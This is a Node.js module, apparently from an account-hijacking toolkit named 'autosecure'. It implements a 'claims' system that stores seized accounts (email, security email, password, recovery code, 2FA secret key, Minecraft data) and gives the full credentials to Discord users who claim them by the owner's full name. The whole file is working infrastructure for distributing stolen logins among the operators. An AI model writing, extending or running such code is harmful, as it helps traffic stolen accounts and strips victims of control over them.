// Claims System for Gift Links - Sub-user account claiming

const { queryParams } = require('./autosecure/db/database');

class ClaimsSystem {
    constructor() {
        this.pendingClaims = new Map(); // Store pending claims
    }

    // Add a secured account to claims pool
    async addClaim(accountData) {
        try {
            const claimId = this.generateClaimId();
            const claimData = {
                id: claimId,
                email: accountData.email,
                secEmail: accountData.secEmail,
                password: accountData.password,
                recoveryCode: accountData.recoveryCode,
                secretkey: accountData.secretkey,
                product: accountData.product,
                minecraft: accountData.minecraft,
                timeTaken: accountData.timeTaken,
                claimedBy: null,
                claimedAt: null,
                fullName: accountData.fullName || 'Unknown',
                createdAt: new Date().toISOString(),
                expiresAt: new Date(Date.now() + (24 * 60 * 60 * 1000)).toISOString() // 24 hours
            };

            // Add to database
            await queryParams(`
                INSERT INTO claims (id, email, secEmail, password, recoveryCode, secretkey, product, minecraft, timeTaken, fullName, claimedBy, claimedAt, createdAt, expiresAt)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            `, [
                claimData.id,
                claimData.email,
                claimData.secEmail,
                claimData.password,
                claimData.recoveryCode,
                claimData.secretkey,
                claimData.product,
                claimData.minecraft,
                claimData.timeTaken,
                claimData.fullName,
                claimData.claimedBy,
                claimData.claimedAt,
                claimData.createdAt,
                claimData.expiresAt
            ]);

            // Send notification to claims channel
            if (typeof global !== 'undefined' && global.client) {
                const { sendClaimNotification } = require('./discord_embeds');
                sendClaimNotification(global.client, claimData).catch(err => {
                    console.error('Error sending claim notification:', err);
                });
            }

            return claimData;
        } catch (error) {
            console.error('Error adding claim:', error);
            throw error;
        }
    }

    // Claim an account by full name
    async claimAccount(fullName, userId) {
        try {
            // Find unclaimed account by full name
            const claims = await queryParams(`
                SELECT * FROM claims 
                WHERE fullName = ? AND claimedBy IS NULL AND expiresAt > datetime('now')
                ORDER BY createdAt ASC
                LIMIT 1
            `, [fullName]);

            if (claims.length === 0) {
                return { success: false, error: 'No available claim found for this name' };
            }

            const claim = claims[0];

            // Mark as claimed
            await queryParams(`
                UPDATE claims 
                SET claimedBy = ?, claimedAt = datetime('now')
                WHERE id = ?
            `, [userId, claim.id]);

            return {
                success: true,
                account: {
                    email: claim.email,
                    secEmail: claim.secEmail,
                    password: claim.password,
                    recoveryCode: claim.recoveryCode,
                    secretkey: claim.secretkey,
                    product: claim.product,
                    minecraft: claim.minecraft,
                    fullName: claim.fullName
                }
            };
        } catch (error) {
            console.error('Error claiming account:', error);
            return { success: false, error: 'Failed to claim account' };
        }
    }

    // Get available claims for a user
    async getAvailableClaims() {
        try {
            const claims = await queryParams(`
                SELECT id, fullName, product, minecraft, createdAt, expiresAt
                FROM claims 
                WHERE claimedBy IS NULL AND expiresAt > datetime('now')
                ORDER BY createdAt ASC
            `);

            return claims;
        } catch (error) {
            console.error('Error getting available claims:', error);
            return [];
        }
    }

    // Get user's claimed accounts
    async getUserClaims(userId) {
        try {
            const claims = await queryParams(`
                SELECT email, secEmail, password, recoveryCode, secretkey, product, minecraft, fullName, claimedAt
                FROM claims 
                WHERE claimedBy = ?
                ORDER BY claimedAt DESC
            `, [userId]);

            return claims;
        } catch (error) {
            console.error('Error getting user claims:', error);
            return [];
        }
    }

    // Clean up expired claims
    async cleanupExpiredClaims() {
        try {
            const result = await queryParams(`
                DELETE FROM claims 
                WHERE expiresAt < datetime('now')
            `);

            if (result.changes > 0) {
                console.log(`Cleaned up ${result.changes} expired claims`);
            }
        } catch (error) {
            console.error('Error cleaning up expired claims:', error);
        }
    }

    // Generate unique claim ID
    generateClaimId() {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let claimId = '';
        for (let i = 0; i < 8; i++) {
            claimId += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return claimId;
    }
}

module.exports = ClaimsSystem;
